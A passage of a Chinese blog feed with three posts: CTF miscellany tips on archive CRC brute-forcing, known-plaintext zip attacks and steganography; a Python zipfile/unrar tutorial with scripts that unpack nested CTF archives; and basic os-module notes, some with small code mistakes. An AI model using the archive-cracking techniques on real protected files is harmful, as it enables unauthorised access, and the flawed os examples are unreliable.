xmlns:rdf&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;02&#x2F;22-rdf-syntax-ns#&quot;&#x2F;&gt;&lt;&#x2F;x:xmpmeta&gt;</span><br></pre></td></tr></table></figure><p>7、压缩包crc爆破一定要搞清楚文件原始大小是多少，使用bandzip查看。</p><p>8、zip可以改doc，同样doc也可以改zip。</p><p>9、如果拿到许多文件，肯定有特殊的文件，如果存在于zip中，则要看一看CRC是不是一样。</p><p>10、任何i都要把流程走一遍，比如binwalk。</p><p>11、拿到二进制先判断数量如果能开放，可以尝试转化为二维码。如果是八的倍数，尝试八个一组转换为二进制。也可以转换成摩斯密码。</p><p>12、如果一个文件提示flag不在这里，呢么很可能这个文件还藏有另一个文件，就是ntfs隐写，7z可以看到是否存在隐写流。</p><p>13、<code>vmdk</code>文件可以用7z解压。</p><p>14、如果有十六进制文件，直接使用01的导入十六进制功能。</p><p>15、拿到一个exe文件可以先尝试运行。</p><p>16、可以使用<code>strings</code>命令来查看是否存在ntfs。</p><p>17、base32解密一定要注意后面的等号个数。</p><p>16、多个文件，一定要注意下多个文件的修改日期、大小、md5等。找到不同的呢个一个。</p><p>17、一个字符串，判断长度。是否是3、8、2的倍数，3的倍数，八进制。2的倍数十六进制。8的倍数二进制八个一组。是否大于128，大于128减去128转换字符串。</p><p>18、看到<code>63、255、127、191</code>，ttl隐写</p><p>19、关于二进制，有时候可以逆序、八位逆序。</p><p>20、数字有重复的话，手机九键盘。</p><p>21、明文攻击一定要使用winrar先进行压缩。如果出现提示：一个文档必须只有一个文件。说明没有用winrar进行压缩。</p><p>22、mp4也可以使用<code>exiftool powpow.mp4</code></p><p>23、zsteg也可以检测bmp。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF-杂项&quot;&gt;&lt;a href=&quot;#CTF-杂项&quot; class=&quot;headerlink&quot; title=&quot;CTF-杂项&quot;&gt;&lt;/a&gt;CTF-杂项&lt;/h1&gt;&lt;h2 id=&quot;压缩包&quot;&gt;&lt;a href=&quot;#压缩包&quot; class=&quot;headerlink&quot; title=&quot;压缩包</summary>
      
    
    
    
    <category term="CTF-杂项" scheme="http://s1eady.top/categories/CTF-%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF-杂项" scheme="http://s1eady.top/tags/CTF-%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>CTF-python库zipfile的使用</title>
    <link href="http://s1eady.top/2020/11/10/CTF-python%E5%BA%93zipfile%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://s1eady.top/2020/11/10/CTF-python%E5%BA%93zipfile%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2020-11-10T05:12:20.000Z</published>
    <updated>2020-11-06T11:29:15.219Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF–python库zipfile的使用"><a href="#CTF–python库zipfile的使用" class="headerlink" title="CTF–python库zipfile的使用"></a>CTF–python库zipfile的使用</h1><h2 id="zipfile库"><a href="#zipfile库" class="headerlink" title="zipfile库"></a>zipfile库</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Python zipfile模块用来做zip格式编码的压缩和解压缩的，要进行相关操作，首先需要实例化一个 ZipFile 对象。ZipFile 接受一个字符串格式压缩包名称作为它的必选参数，第二个参数为可选参数，表示打开模式，类似于文件操作，有r/w/a三种模式，分别代表读、写、添加，默认为r，即读模式。</p><p>zipfile里有两个非常重要的class, 分别是ZipFile和ZipInfo, 在绝大多数的情况下，我们只需要使用这两个class就可以了。ZipFile是主要的类，用来创建和读取zip文件而ZipInfo是存储的zip文件的每个文件的信息的。</p><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><h4 id="ZipFile-对象"><a href="#ZipFile-对象" class="headerlink" title="ZipFile 对象"></a>ZipFile 对象</h4><p>定义</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zipfile.ZipFile(file,mode,compress_type,allowZip64) <span class="meta">#创建一个ZipFile对象  </span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file: zip文件名</span><br><span class="line">mode: <span class="string">&#x27;r&#x27;</span>读已存在的zip文件,<span class="string">&#x27;w&#x27;</span>新建或覆盖已存在的zip文件,<span class="string">&#x27;a&#x27;</span>附加到现存的 zip文档</span><br><span class="line">compress_type: zipfile.ZIP_STORED 默认不压缩, zipfile.ZIP_DEFLATED 压缩</span><br><span class="line">allowZip64 : 默认 False, zip超过<span class="number">2</span>G设置为True</span><br></pre></td></tr></table></figure><p>以只读的方式打开一个zip文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">z=zipfile.ZipFile(<span class="string">&quot;flag.zip&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">print(z)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;zipfile.ZipFile filename=<span class="string">&#x27;flag.zip&#x27;</span> mode=<span class="string">&#x27;r&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="ZipFile-成员函数"><a href="#ZipFile-成员函数" class="headerlink" title="ZipFile 成员函数"></a>ZipFile 成员函数</h4><ul><li>ZipFile.getinfo(name) #获取zip文档内指定文件信息, 返回zipfile.ZipInfo对象</li><li>ZipFile.infolist() #获取zip文档内所有文件信息, 返回zipfile.ZipInfo列表</li><li>ZipFile.namelist() #获取zip文档内所有文件的名称列表</li><li>ZipFile.extract(member,path,pwd) #把zip文档内指定文件解压到指定目录<ul><li>member : 要解压的文件名称或ZipInfo对象</li><li>path : 指定解压目录(默认当前目录)</li><li>pwd : 解压密码</li></ul></li><li>ZipFile.extractall(path,members,pwd) #解压zip文档到指定目录<ul><li>path : 解压目的目录, 默认当前目录</li><li>members : 设置的文件名列表, 默认全部</li><li>pwd : 解压密码</li></ul></li><li>ZipFile.printdir() #打印zip文档信息</li><li>ZipFile.setpassword(pwd) #设置zip文档密码<ul><li>pwd : 解压密码</li></ul></li><li>ZipFile.read(name,pwd) #获取zip文档内指定文件的二进制<ul><li>name : zip文档内指定文件</li><li>pwd : 解压密码</li></ul></li><li>ZipFile.write(filename,arcname,compress_type) #添加指定文件到zip文档中<ul><li>filename : 文件路径</li><li>arcname : 保存的名称</li><li>compress_type : zipfile.ZIP_STORED 默认不压缩, zipfile.ZIP_DEFLATED 压缩</li></ul></li><li>ZipFile.writestr(zinfo_or_arcname,bytes) #直接写二进制到压缩文档</li></ul><h5 id="z-Zipinfo"><a href="#z-Zipinfo" class="headerlink" title="z.Zipinfo()"></a>z.Zipinfo()</h5><p>z.infolist(), 它返回的就是压缩包内所有文件的信息，就是一个ZipInfo的列表。以下是一些压缩包常用的属性。比较常用的是 filename, file_size, header_offset, 分别为文件名，文件大小，文件数据在压缩包中的偏移，在打CTF的时候我们也常使用CRC，进行CRC爆破。</p><ul><li>ZipInfo.filename #文件名称</li><li>ZipInfo.date_time #最后修改时间, 返回(年,月,日,时,分,秒)的元组</li><li>ZipInfo.compress_type #压缩类型</li><li>ZipInfo.comment #文档说明</li><li>ZipInfo.extr #扩展项数据</li><li>ZipInfo.create_system #创建该文档的系统</li><li>ZipInfo.create_version #创建该文档的PKZIP版本</li><li>ZipInfo.extract_version #解压该文档所需的PKZIP版本</li><li>ZipInfo.reserved #预留字段</li><li>ZipInfo.flag_bits #zip标志位</li><li>ZipInfo.volume #文件头的卷标</li><li>ZipInfo.internal_attr #内部属性</li><li>ZipInfo.external_attr #外部属性</li><li>ZipInfo.header_offset #文件头偏移位</li><li>ZipInfo.CRC #未压缩文件的CRC-32</li><li>ZipInfo.compress_size #压缩后大小</li><li>ZipInfo.file_size #未压缩大小</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">z=zipfile.ZipFile(<span class="string">&quot;flag.zip&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">print(z.infolist())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> z.infolist():</span><br><span class="line">    print(i.filename,i.CRC)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&lt;ZipInfo filename=<span class="string">&#x27;flag.png&#x27;</span> compress_type=deflate external_attr=<span class="number">0x20</span> file_size=<span class="number">13642</span> compress_size=<span class="number">1592</span>&gt;]</span><br><span class="line">flag.png <span class="number">1926850634</span></span><br></pre></td></tr></table></figure><h5 id="z-namelist"><a href="#z-namelist" class="headerlink" title="z.namelist()"></a>z.namelist()</h5><p>z.namelist() 会返回压缩包内所有文件名的列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">z=zipfile.ZipFile(<span class="string">&quot;flag.zip&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">print(z.namelist())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> z.namelist():</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;flag.png&#x27;</span>]</span><br><span class="line">flag.png</span><br></pre></td></tr></table></figure><h5 id="z-read"><a href="#z-read" class="headerlink" title="z.read()"></a>z.read()</h5><p>获取zip文档内指定文件的二进制数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">z=zipfile.ZipFile(<span class="string">&quot;flag.zip&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">print(z.infolist())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> z.infolist():</span><br><span class="line">    date=z.read(i.filename)</span><br><span class="line">    print(date)</span><br></pre></td></tr></table></figure><p>输出文件的二进制形式，可以通过open函数对文件进行操作，将二进制形式写入文件中。</p><h5 id="z-write"><a href="#z-write" class="headerlink" title="z.write()"></a>z.write()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZipFile.write(filename[, arcname[, compress_type]])</span><br></pre></td></tr></table></figure><p>将指定文件添加到zip文档中。filename为文件路径，arcname为添加到zip文档之后保存的名称, 参数compress_type表示压缩方法，它的值可以是zipfile. ZIP_STORED 或zipfile. ZIP_DEFLATED。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">z=zipfile.ZipFile(<span class="string">r&quot;steady.zip&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">z.write(<span class="string">&#x27;./flag.png&#x27;</span>,<span class="string">&#x27;steady.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>使用之后会在当前目录生成一个steady.zip的压缩包，压缩包的内容为steady.png。</p><h5 id="z-extract"><a href="#z-extract" class="headerlink" title="z.extract()"></a>z.extract()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZipFile.extract(member[, path[, pwd]])</span><br></pre></td></tr></table></figure><p>将zip文档内的指定文件解压到当前目录。参数member指定要解压的文件名称或对应的ZipInfo对象；参数path指定了解析文件保存的文件夹；参数pwd为解压密码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">z=zipfile.ZipFile(<span class="string">&quot;steady.zip&quot;</span>)</span><br><span class="line">z.extract(z.namelist()[<span class="number">0</span>],<span class="string">&#x27;./gif/&#x27;</span>)</span><br></pre></td></tr></table></figure><p>注意extract的使用对象是zipfile对象，它提取的文件名字是压缩包内的名字而不是压缩包的名字。</p><h5 id="z-extractall"><a href="#z-extractall" class="headerlink" title="z.extractall()"></a>z.extractall()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZipFile.extractall([path[, members[, pwd]]])</span><br></pre></td></tr></table></figure><p>解压zip文档中的所有文件到当前目录。参数members的默认值为zip文档内的所有文件名称列表，也可以自己设置，选择要解压的文件名称。</p><h2 id="unrar库"><a href="#unrar库" class="headerlink" title="unrar库"></a>unrar库</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>unrar第三方python库是解压rar压缩文件的扩展包，可实现对rar压缩文件的读取、解压等处理。也可以使用unrar这个模块来进行编写rar压缩文件暴力破解。</p><h4 id="使用方式-1"><a href="#使用方式-1" class="headerlink" title="使用方式"></a>使用方式</h4><h5 id="rar对象"><a href="#rar对象" class="headerlink" title="rar对象"></a>rar对象</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unrar <span class="keyword">import</span> rarfile  </span><br><span class="line">rar = rarfile.RarFile(<span class="string">&#x27;flag.rar&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">print(rar)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;unrar.rarfile.RarFile object at <span class="number">0x000002B0FC347880</span>&gt;</span><br></pre></td></tr></table></figure><h5 id="rarfile成员对象函数"><a href="#rarfile成员对象函数" class="headerlink" title="rarfile成员对象函数"></a>rarfile成员对象函数</h5><h6 id="rar-namelist"><a href="#rar-namelist" class="headerlink" title="rar.namelist()"></a>rar.namelist()</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unrar <span class="keyword">import</span> rarfile  </span><br><span class="line">rar = rarfile.RarFile(<span class="string">&#x27;flag.rar&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">print(rar.namelist())</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;flag.png&#x27;</span>]</span><br></pre></td></tr></table></figure><h6 id="rar-printdir"><a href="#rar-printdir" class="headerlink" title="rar.printdir()"></a>rar.printdir()</h6><p>打印rar压缩文件中的文件列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unrar <span class="keyword">import</span> rarfile  </span><br><span class="line">rar = rarfile.RarFile(<span class="string">&#x27;flag.rar&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">rar.printdir()</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File Name                                             Modified             Size</span><br><span class="line">flag.png                                       <span class="number">2020</span><span class="number">-11</span><span class="number">-01</span> <span class="number">10</span>:<span class="number">11</span>:<span class="number">02</span>        <span class="number">13642</span></span><br></pre></td></tr></table></figure><h6 id="rar-extractall"><a href="#rar-extractall" class="headerlink" title="rar.extractall()"></a>rar.extractall()</h6><p>解压rar压缩文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rf.extract(文件名字, 解压文件存放的路径) </span><br></pre></td></tr></table></figure><h2 id="CTF题目利用"><a href="#CTF题目利用" class="headerlink" title="CTF题目利用"></a>CTF题目利用</h2><h3 id="CMP03-Multiple"><a href="#CMP03-Multiple" class="headerlink" title="CMP03 Multiple"></a>CMP03 Multiple</h3><p>文件名称就是压缩包的密码。使用python批量解压。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> unrar <span class="keyword">import</span> rarfile</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unzip</span>(<span class="params">zipname</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        passwd = zipname[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">        zf = rarfile.RarFile(<span class="string">&#x27;C:/Users/12521/gif/&#x27;</span>+zipname,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        zf.extractall(<span class="string">&#x27;./gif/&#x27;</span>,pwd=passwd)</span><br><span class="line"><span class="comment">#        zf.close()</span></span><br><span class="line">        os.remove(zipname)</span><br><span class="line">        zipname = zf.namelist()[<span class="number">0</span>].replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        print(zipname)</span><br><span class="line">unzip(<span class="string">&quot;flag.rar&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="qctl-zip"><a href="#qctl-zip" class="headerlink" title="qctl.zip"></a>qctl.zip</h3><p>同理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile,os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unzip</span>(<span class="params">zipname</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        passwd = zipname.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        zf = zipfile.ZipFile(zipname,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        zf.extractall(pwd=passwd.encode())</span><br><span class="line">        zf.close()</span><br><span class="line">        os.remove(zipname)</span><br><span class="line">        zipname = zf.namelist()[<span class="number">0</span>]</span><br><span class="line">unzip(<span class="string">&quot;qctl.zip&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF–python库zipfile的使用&quot;&gt;&lt;a href=&quot;#CTF–python库zipfile的使用&quot; class=&quot;headerlink&quot; title=&quot;CTF–python库zipfile的使用&quot;&gt;&lt;/a&gt;CTF–python库zipfile的使用&lt;/</summary>
      
    
    
    
    <category term="CTF-python" scheme="http://s1eady.top/categories/CTF-python/"/>
    
    
    <category term="CTF-python" scheme="http://s1eady.top/tags/CTF-python/"/>
    
  </entry>
  
  <entry>
    <title>Python学习--os库的使用</title>
    <link href="http://s1eady.top/2020/11/10/Python%E5%AD%A6%E4%B9%A0--os%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://s1eady.top/2020/11/10/Python%E5%AD%A6%E4%B9%A0--os%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2020-11-10T00:34:13.000Z</published>
    <updated>2020-11-10T01:29:26.011Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h1><p>OS模块简单的来说它是一个Python的系统编程的操作模块，可以处理文件和目录这些我们日常手动需要做的操作。</p><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><h3 id="获取当前系统"><a href="#获取当前系统" class="headerlink" title="获取当前系统"></a>获取当前系统</h3><figure class="highlight python"><figcaption><span>y</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">print(os.name)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#若是Windows则输出&#39;nt&#39;，若是Linux&#x2F;Unix，则是&#39;posix&#39;</span><br></pre></td></tr></table></figure><h3 id="获取当前文件的绝对路径"><a href="#获取当前文件的绝对路径" class="headerlink" title="获取当前文件的绝对路径"></a>获取当前文件的绝对路径</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">steady_path = os.path.abspath(__file__)</span><br><span class="line">print(steady_path)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady.py</span><br></pre></td></tr></table></figure><h3 id="获取当前目录"><a href="#获取当前目录" class="headerlink" title="获取当前目录"></a>获取当前目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">cwd &#x3D; os.getcwd()</span><br><span class="line">print(cwd)</span><br></pre></td></tr></table></figure><p>输出：获取的是python的工作目录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Users&#x2F;apple</span><br></pre></td></tr></table></figure><h3 id="判断文件是否存在，返回值为布尔型"><a href="#判断文件是否存在，返回值为布尔型" class="headerlink" title="判断文件是否存在，返回值为布尔型"></a>判断文件是否存在，返回值为布尔型</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">steady_path = <span class="string">r&quot;/Users/apple/Desktop/steady.py&quot;</span></span><br><span class="line">steady_file = os.path.exists(steady_path)</span><br><span class="line">print(<span class="string">&quot;file path: [&#123;&#125;] is exist: &#123;&#125;&quot;</span>.format(steady_path, steady_file))</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file path: [&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady.py] is exist: True</span><br></pre></td></tr></table></figure><h3 id="获取当前文件的名称"><a href="#获取当前文件的名称" class="headerlink" title="获取当前文件的名称"></a>获取当前文件的名称</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">steady_name = os.path.basename(__file__)</span><br><span class="line">print(steady_name)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady.py</span><br></pre></td></tr></table></figure><h3 id="文件重命名"><a href="#文件重命名" class="headerlink" title="文件重命名"></a>文件重命名</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">old_file = <span class="string">r&quot;/Users/apple/Desktop/steady.py&quot;</span></span><br><span class="line"></span><br><span class="line">new_file = <span class="string">r&quot;/Users/apple/Desktop/steady.py&quot;</span></span><br><span class="line"></span><br><span class="line">os.rename(old_file, new_file)</span><br></pre></td></tr></table></figure><h3 id="创建文件夹"><a href="#创建文件夹" class="headerlink" title="创建文件夹"></a>创建文件夹</h3><h4 id="os-makedirs"><a href="#os-makedirs" class="headerlink" title="os.makedirs"></a><code>os.makedirs</code></h4><p>创建多级目录，路径中的多个文件夹都不存在时，可以递归创建，steady和steady1文件夹本身没有。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady_path &#x3D; r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady&#x2F;steady1&quot;</span><br><span class="line">os.mkdir(steady_path)</span><br></pre></td></tr></table></figure><h4 id="os-path-mkdir"><a href="#os-path-mkdir" class="headerlink" title="os.path.mkdir"></a><code>os.path.mkdir</code></h4><p>只能创建一个文件夹， steady文件夹存在，才能创建steady1文件夹，如果steady文件夹不存在，则会出错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady_path &#x3D; r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady&#x2F;steady1&quot;</span><br><span class="line">os.mkdir(steady_path)</span><br></pre></td></tr></table></figure><h3 id="获取文件夹下的所有文件名"><a href="#获取文件夹下的所有文件名" class="headerlink" title="获取文件夹下的所有文件名"></a>获取文件夹下的所有文件名</h3><p>获取文件夹code下的所有文件名，以列表的形式返回。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steady_path &#x3D; r&quot;&#x2F;Users&#x2F;apple&quot;</span><br><span class="line">steady_names &#x3D; os.listdir(steady_path)</span><br><span class="line">print(steady_names)</span><br></pre></td></tr></table></figure><h3 id="获取文件夹下的所有文件夹和文件（无递归遍历）"><a href="#获取文件夹下的所有文件夹和文件（无递归遍历）" class="headerlink" title="获取文件夹下的所有文件夹和文件（无递归遍历）"></a>获取文件夹下的所有文件夹和文件（无递归遍历）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(os.scandir(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;&quot;))</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;posix.ScandirIterator object at 0x1056a1e30&gt;</span><br></pre></td></tr></table></figure><p>返回的是可迭代对象，可以用for循环迭代一下遍出结果。</p><h3 id="f-is-file"><a href="#f-is-file" class="headerlink" title="f.is_file()"></a>f.is_file()</h3><p>is_file判断是否是文件。</p><h3 id="将path分割成路径名和文件名"><a href="#将path分割成路径名和文件名" class="headerlink" title="将path分割成路径名和文件名"></a>将path分割成路径名和文件名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">print(os.path.split(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady1.py&quot;))</span><br><span class="line">print(os.path.split(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady1.py&quot;)[0])</span><br><span class="line">print(os.path.split(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady1.py&quot;)[1])</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Users&#x2F;apple&#x2F;Desktop</span><br><span class="line">steady1.py</span><br></pre></td></tr></table></figure><h3 id="拼接目录与文件名或目录"><a href="#拼接目录与文件名或目录" class="headerlink" title="拼接目录与文件名或目录"></a>拼接目录与文件名或目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">print(os.path.join(&#39;I&#39;, &#39;am&#39;, &#39;steady&#39;))</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I&#x2F;am&#x2F;steady</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
